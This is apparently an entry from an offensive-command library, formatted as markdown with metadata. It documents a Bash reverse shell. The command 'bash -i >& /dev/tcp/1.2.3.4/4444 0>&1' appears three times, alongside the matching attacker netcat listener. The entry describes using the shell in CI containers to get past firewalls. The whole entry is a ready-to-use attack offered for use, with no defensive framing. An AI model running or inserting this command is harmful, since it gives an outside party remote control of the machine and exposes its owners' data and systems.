---
data: bash -i >& /dev/tcp/1.2.3.4/4444 0>&1
tags:
  - reverse-shell
type: command
executor: bash
platforms:
  - Linux
id: 87479bf7-f007-4246-9129-77efaa07f3e0
created_at: '2025-12-14T04:08:48.090Z'
updated_at: '2025-12-14T04:08:48.090Z'
verified: false
validated: true
submitted: true
---
# Bash Reverse Shell to Attacker

## Command

```bash
bash -i >& /dev/tcp/1.2.3.4/4444 0>&1
```

## Description

Establishes an interactive Bash shell connecting back to the attacker's TCP listener, redirecting I/O for remote control. Used in restricted environments like CI containers to bypass firewalls.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| IP | Attacker's IP address | Yes |
| port | Listening port (e.g., 4444) | Yes |

## Examples

### Basic Usage

```bash
bash -i >& /dev/tcp/1.2.3.4/4444 0>&1
```

### Advanced Usage

Use with nc on attacker: nc -lvp 4444.

## Expected Output

Interactive shell prompt on attacker's nc session.

## Related

- [[commands/nc-listen-for-shell]]
